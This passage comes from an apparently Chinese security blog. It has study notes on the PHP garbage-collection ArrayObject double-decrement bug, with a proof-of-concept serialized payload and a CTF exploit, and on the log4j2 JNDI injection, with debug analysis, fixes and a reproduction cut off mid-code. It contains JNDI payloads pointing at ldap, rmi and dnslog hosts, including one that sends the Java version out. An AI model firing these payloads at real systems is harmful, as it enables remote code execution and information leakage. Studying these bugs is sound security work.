id="新版本GC-zval结构体"><a href="#新版本GC-zval结构体" class="headerlink" title="新版本GC-zval结构体"></a>新版本GC-zval结构体</h3><p>主动销毁变量：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;111&quot;</span>;<br><span class="hljs-variable">$temp_name</span> = &amp;<span class="hljs-variable">$name</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>(<span class="hljs-string">&#x27;name&#x27;</span>);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$temp_name</span>);<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>(<span class="hljs-string">&#x27;name&#x27;</span>);<br><span class="hljs-comment">//name:</span><br><span class="hljs-comment">//(refcount=2, is_ref=1)string &#x27;111&#x27; (length=3)</span><br><span class="hljs-comment">//name:</span><br><span class="hljs-comment">//(refcount=1, is_ref=1)string &#x27;111&#x27; (length=3)</span><br></code></pre></td></tr></table></figure><p>refcount计数减1，说明unset并非一定会释放内存，当有两个变量指向的时候，并非会释放变量占用的内存，只是refcount减1.</p><h3 id="触发垃圾回收"><a href="#触发垃圾回收" class="headerlink" title="触发垃圾回收"></a>触发垃圾回收</h3><p>该算法的实现可以在<code>Zend/zend_gc.c</code>（ <a href="https://github.com/php/php-src/blob/PHP-5.6.0/Zend/zend_gc.c">https://github.com/php/php-src/blob/PHP-5.6.0/Zend/zend_gc.c</a> ）中找到。每当销毁zval时（如在该zval上调用unset时），垃圾回收算法会检查其是否为数组或对象，除了这俩个类型外其他都不能包含循环引用，这一检查过程使用<code>gc_zval_possible_root</code>函数来实现。任何这种潜在的zval都被称为根（Root），并会被添加到一个名为<code>gc_root_buffer</code>的列表中。<br>然后，将会重复上述步骤，直至满足下述条件之一：</p><ul><li><code>gc_collect_cycles()</code>被手动调用</li><li>垃圾存储空间将满。这也就意味着，在根缓冲区的位置已经存储了10000个zval，并且即将添加新的根。10000时预定义常量GC_ROOT_BUFFER_MAX_ENTRIES,当出现第10001个zval时，将再次调用gc_zval_possible_root进行检查，此时会调用<code>gc_collect_cycles</code>以处理并刷新当前缓冲区</li></ul><blockquote><p>可以得到触发思路，填满垃圾存储空间</p></blockquote><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>反序列化过程允许一遍又一遍地传递相同的索引，所以不断会填充内存空间。一旦重新使用数组索引，旧元素的引用计数器就会递减。在反序列化过程中将会调用<code>zend_hash_update</code>，它将调用旧元素的析构函数（Destructor）。每当zval被销毁时，都会涉及到垃圾回收。这也就意味着，所有创建的数组都会开始填充垃圾缓冲区，直至超出其空间导致对<code>gc_collect_cycles</code>的调用。</p><h3 id="ArrayObject"><a href="#ArrayObject" class="headerlink" title="ArrayObject"></a>ArrayObject</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// POC of the ArrayObject GC vulnerability</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$serialized_string</span> = <span class="hljs-string">&#x27;a:1:&#123;i:1;C:11:&quot;ArrayObject&quot;:37:&#123;x:i:0;a:2:&#123;i:1;R:4;i:2;r:1;&#125;;m:a:0:&#123;&#125;&#125;&#125;&#x27;</span>;<br><span class="hljs-variable">$outer_array</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serialized_string</span>);<br><span class="hljs-title function_ invoke__">gc_collect_cycles</span>();<br><span class="hljs-variable">$filler1</span> = <span class="hljs-string">&quot;aaaa&quot;</span>;<br><span class="hljs-variable">$filler2</span> = <span class="hljs-string">&quot;bbbb&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$outer_array</span>);<br></code></pre></td></tr></table></figure><p>实际上，一旦该示例执行，外部数组（由<code>$outer_array</code>引用）将会被释放，并且zval将会被<code>$filter2</code>的zval覆盖，导致输出”bbbb”。</p><p>ArrayObject的反序列化函数接受对另一个数组的引用，以用于初始化的目的。这也就意味着，一旦我们对一个ArrayObject进行反序列化后，就可以引用任何之前已经被反序列化过的数组。此外，这还将允许我们将整个哈希表中的所有条目递减两次。</p><p>1、得到一个应被释放的目标zval X；<br>2、创建一个数组Y，其中包含几处对zval X的引用：<code>array(ref_to_X, ref_to_X, […], ref_to_X)</code>；<br>3、创建一个ArrayObject，它将使用数组Y的内容进行初始化，因此会返回一次由垃圾回收标记算法访问过的数组Y的所有子元素。<br>通过上述步骤，我们可以操纵标记算法，对数组Y中的所有引用实现两次访问。但是，在反序列化过程中创建引用将会导致引用计数器增加2，所以还要找到解决方案：<br>4、使用与步骤3相同的方法，额外再创建一个ArrayObject。<br>一旦标记算法访问第二个ArrayObject，它将开始对数组Y中的所有引用进行第三次递减。我们现在就有方法能够使引用计数器递减，可以将该方法用于对任意目标zval的引用计数器实现清零。</p><p>举个例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$flag</span> =<span class="hljs-string">&quot;flag&#123;&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(time).<span class="hljs-string">&quot;&#125;&quot;</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;successful\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);<br><br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;中途退出啦&#x27;</span>);<br></code></pre></td></tr></table></figure><p>我们假如要执行__destruct方法，打印flag，就得绕过这个<code>throw new Exception</code>。因为<code>__destruct</code>方法是在该对象被回收时调用，而<code>exception</code>会中断该进程对该对象的销毁。所以我们需要强制让php的GC（垃圾回收机制）去进行该对象的回收。</p><p>核心思想：反序列化一个数组，然后再利用第一个索引，来触发GC</p><p>EXP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;AndyNoel&quot;</span>;<br>    &#125;<br>&#125; <br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> B, <span class="hljs-keyword">new</span> B));<br><br><span class="hljs-comment">//a:2:&#123;i:0;O:1:&quot;B&quot;:0:&#123;&#125;i:1;O:1:&quot;B&quot;:0:&#123;&#125;&#125;</span><br></code></pre></td></tr></table></figure><blockquote><p>造成该漏洞的主要原因是ArrayObject缺少垃圾回收函数。该漏洞称为“双递减漏洞”</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
            <tag> gc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>log4j2漏洞学习</title>
      <link href="/2022/09/30/log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/09/30/log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="log4j2漏洞学习"><a href="#log4j2漏洞学习" class="headerlink" title="log4j2漏洞学习"></a>log4j2漏洞学习</h1><h2 id="log4j与log4j2区别"><a href="#log4j与log4j2区别" class="headerlink" title="log4j与log4j2区别"></a>log4j与log4j2区别</h2><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>log4j用.properties的文件作为主配置文件的，而现在的log4j 2则已经弃用了这种方式，采用的是.xml，.json或者.jsn这种方式来做</p><h3 id="核心jar包"><a href="#核心jar包" class="headerlink" title="核心jar包"></a>核心jar包</h3><p>log4j只需要引入一个jar包即可，</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.17<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>而log4j 2则是需要2个核心</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>log4j和log4j 2的包路径是不同的,甚至可以在一个项目中使用2个版本的日志输出</p></blockquote><h3 id="文件渲染"><a href="#文件渲染" class="headerlink" title="文件渲染"></a>文件渲染</h3><p>log4j想要生效，我们需要在web.xml中进行配置</p><p>log4j2就比较简单，以maven工程为例，我们只需要把log4j2.xml放到工程resource目录下就行了。大家记住一个细节点，是log4j2.xml，而不是log4j.xml，<u>xml名字少个2都不行</u></p><h3 id="log调用"><a href="#log调用" class="headerlink" title="log调用"></a>log调用</h3><p>log4j</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.log4j.Logger;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">LOGGER</span> <span class="hljs-operator">=</span> Logger.getLogger(Test.class.getName());<br></code></pre></td></tr></table></figure><p>log4j2</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.logging.log4j.Level;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger(Test.class.getName());<br></code></pre></td></tr></table></figure><h2 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h2><p>如果log4j.properties一直不起作用，将其复制到target的classesxia</p><p><img src="/../../../../Pictures/%60log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%60/006y8mN6gy1h6qwvy8e0hj30r8056glt.jpg" alt="image-20221002140908570"></p><h3 id="一些配置教训"><a href="#一些配置教训" class="headerlink" title="一些配置教训"></a>一些配置教训</h3><p>注意版本对应</p><p>如果是2021.3的idea，不要使用高版本maven，应使用3.5.4</p><h3 id="引入依赖"><a href="#引入依赖" class="headerlink" title="引入依赖"></a>引入依赖</h3><p>第一次引入会因为没有下载而爆红，点击刷新即可</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232951.jpg" alt="image-20221002141921173"></p><h3 id="导包注意名称"><a href="#导包注意名称" class="headerlink" title="导包注意名称"></a>导包注意名称</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br></code></pre></td></tr></table></figure><blockquote><p>2.14.0 log4j导包</p></blockquote><h3 id="程序包-com-sun-jndi-rmi-registry-不可见"><a href="#程序包-com-sun-jndi-rmi-registry-不可见" class="headerlink" title="程序包 com.sun.jndi.rmi.registry 不可见"></a>程序包 com.sun.jndi.rmi.registry 不可见</h3><p>注意：还是得换成jdk1.8</p><p>解决，在pom.xml中加入以下标签</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">source</span>&gt;</span>$&#123;java.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">source</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">target</span>&gt;</span>$&#123;java.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">encoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">encoding</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">compilerArguments</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">bootclasspath</span>&gt;</span>$&#123;java.home&#125;/lib/rt.jar<span class="hljs-tag">&lt;/<span class="hljs-name">bootclasspath</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">compilerArguments</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>注意：plugin标签要包裹在plugins中，plugins要包裹在build中</p></blockquote><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><p>一般将日志对象定义为当前类等静态私有成员</p><h3 id="使用占位符-打印日志"><a href="#使用占位符-打印日志" class="headerlink" title="使用占位符{}打印日志"></a>使用占位符{}打印日志</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;bob&quot;</span>;<br><br>    logger.error(<span class="hljs-string">&quot;&#123;&#125; is not exited!&quot;</span>,user);<br>&#125;<br></code></pre></td></tr></table></figure><p>成功打印</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232469.jpg" alt="image-20221002151825195"></p><h3 id="lookups"><a href="#lookups" class="headerlink" title="lookups"></a>lookups</h3><p>可以通过<code>$&#123;xxx:xxx&#125;</code>等形式快速获取运行应用容器的docker属性，环境变量，日志事件，Java应用程序环境信息等内容。</p><h1 id="漏洞及分析"><a href="#漏洞及分析" class="headerlink" title="漏洞及分析"></a>漏洞及分析</h1><h3 id="影响版本范围"><a href="#影响版本范围" class="headerlink" title="影响版本范围"></a>影响版本范围</h3><p>2.0-beta9 &lt;&#x3D; Apache Log4j &lt;&#x3D; 2.15.0-rc1（1.x不受影响）</p><p>需要导入log4j-core才行</p><p>先用2.14.0做实验(JDK 1.8下)</p><blockquote><p>原理：JNDI注入</p></blockquote><h2 id="利用lookups获取敏感信息"><a href="#利用lookups获取敏感信息" class="headerlink" title="利用lookups获取敏感信息"></a>利用lookups获取敏感信息</h2><p>输出JDK版本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">LOGGER.error(<span class="hljs-string">&quot;Java version :&#123;&#125;&quot;</span>,<span class="hljs-string">&quot;$&#123;java:version&#125;&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232986.jpg" alt="image-20221002153617894"></p><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>组件中lookup功能的实现类JndiLookup的设计缺陷导致，这个类是在Log4j-core-xxx.jar，所以这个漏洞和Log4j-core有关</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232662.jpg" alt="image-20221002153838589"></p><p>在调用lookup方法处打断点</p><p>JNDI lookup的方法调用在InitialContext.java中</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232530.jpg" alt="image-20221002154141225"></p><h3 id="Debug过程"><a href="#Debug过程" class="headerlink" title="Debug过程"></a>Debug过程</h3><p>测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">logger.error(<span class="hljs-string">&quot;野猪热恋$&#123;jndi:ldap://atf6sq.dnslog.cn&#125;&quot;</span>);<br></code></pre></td></tr></table></figure><p>直接传入的就是${}中的内容(没有过滤),也没有传入其他部分</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232515.jpg" alt="image-20221002154417043"></p><p>查看执行链过程,该lookup方法后续在JndiLookup中被调用</p><p><img src="/../../../../Pictures/%60log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%60/006y8mN6gy1h6qzrx5jggj30u204wgm9.jpg" alt="image-20221002154907000"></p><p>过程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">JndiLookup.java:<br>var6 = Objects.toString(jndiManager.lookup(jndiName), (String)<span class="hljs-literal">null</span>);<br><br>JndiManager.java:<br><span class="hljs-keyword">public</span> T <span class="hljs-title function_">lookup</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String name)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.context.lookup(name);<br>&#125;<br><br>Context.java:<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">lookup</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> NamingException;<br><br>InitialContext.java<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">lookup</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br><span class="hljs-keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);<br>&#125;<br></code></pre></td></tr></table></figure><p>之后处理变量的工作交给了StrSubstitutor这个类</p><p>之后又调用了MessagePatternConverter这个类的format方法</p><ol><li>首先是noLookups这个属性，设置成了false，导致下面代码的执行（现在漏洞修复将这个noLookups设置成true）</li><li>后面的if明显是要定位到<code>$&#123;</code>（并且是连续的），如果有这两个字符就去replace函数替换</li><li>config.getStrSubstitutor()就是上面说的StrSubstitutor</li></ol><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232226.jpg" alt="image-20221002160354461"></p><blockquote><p>Log4j将要输出的日志拼接成字符串之后，它会去判断字符串中是否包含${和},如果包含了，就会当作变量交给StrSubstitutor这个类去处理。</p></blockquote><p>StrSubstitutor中resolveVariable方法获取${}中字符串</p><p><img src="/../../../../Pictures/%60log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%60/006y8mN6gy1h6r0jtfl7mj31ck05ojt3.jpg" alt="image-20221002161555507"></p><p>可以看到resolver中的内容，可以看到Lookups定义了12种处理类型，如果能匹配到这几种处理类型，就交给它们去处理，其他的都会交给defaultLookup去处理。</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232081.jpg" alt="image-20221002161942852"></p><blockquote><p>如果我们的日志内容中有<code>$&#123;jndi:rmi://127.0.0.1:1099/hello&#125;</code>这些内容，去掉${和}传递给resolver的就是<code>jndi:rmi://127.0.0.1:1099/hello</code>。resolver会将第一个”:”之前的内容和lookups做匹配，我们这里获取到的是jndi，就会将剩余部分<code>jndi:rmi://127.0.0.1:1099/hello</code>交给jdni的处理器JndiLookup去处理。</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232251.jpg" alt="image-20221002162800611"></p></blockquote><p>传入是信息debug标注，最好用的lookup.lookup也是JNDI的lookup</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232513.jpg" alt="image-20221002162941649"></p><blockquote><p>从而得到了lookup的结果</p></blockquote><h3 id="noLookups相关"><a href="#noLookups相关" class="headerlink" title="noLookups相关"></a>noLookups相关</h3><p>调用formate</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232599.jpg" alt="image-20221002171504977"></p><p>赋值操作（位于 MessagePatternConverter类中）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-type">int</span> <span class="hljs-variable">noLookupsIdx</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.loadNoLookups(options);<br>        <span class="hljs-built_in">this</span>.noLookups = Constants.FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS || noLookupsIdx &gt;= <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-title function_">loadNoLookups</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String[] options)</span> &#123;<br>        <span class="hljs-keyword">if</span> (options != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; options.length; ++i) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">option</span> <span class="hljs-operator">=</span> options[i];<br>                <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;nolookups&quot;</span>.equalsIgnoreCase(option)) &#123;<br>                    <span class="hljs-keyword">return</span> i;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><blockquote><p>由于调用 MessagePatternConverter类的format方法 没有传入options且config非空，并且环境变量也没有设置因此noLookups为false</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232069.jpg" alt="image-20221002190435592"></p></blockquote><h3 id="漏洞检测方法"><a href="#漏洞检测方法" class="headerlink" title="漏洞检测方法"></a>漏洞检测方法</h3><p>通过dnslog，还能查看jdk版本是否支持RMI或者ldap服务</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">$&#123;jndi:dns://$&#123;<span class="hljs-keyword">sy</span><span class="hljs-variable">s:java</span>.<span class="hljs-keyword">version</span>&#125;.dnslog/&#125;<br></code></pre></td></tr></table></figure><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>1、升级到2.17.0版本及以上</p><p>2、参数、环境设置</p><ul><li><p>设置jvm参数：-Dlog4j2.formatMsgNoLookups&#x3D;true，</p></li><li><p>设置系统环境变量：FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS&#x3D;true</p></li></ul><blockquote><p>JNDI可访问的现有的目录及服务有:JDBC、LDAP、RMI、DNS、NIS、CORBA</p></blockquote><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>JDK：11.0.15</p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>JNDI相当于自己做一个服务，如果访问了会直接在放我这本机上执行方法中的代码</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232104.jpg" alt="image-20221002194642057"></p><h2 id="简单复现"><a href="#简单复现" class="headerlink" title="简单复现"></a>简单复现</h2><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072233648.jpg" alt="tststst"></p><p>RMIServer.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.cui.log4jtest.rmi;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title 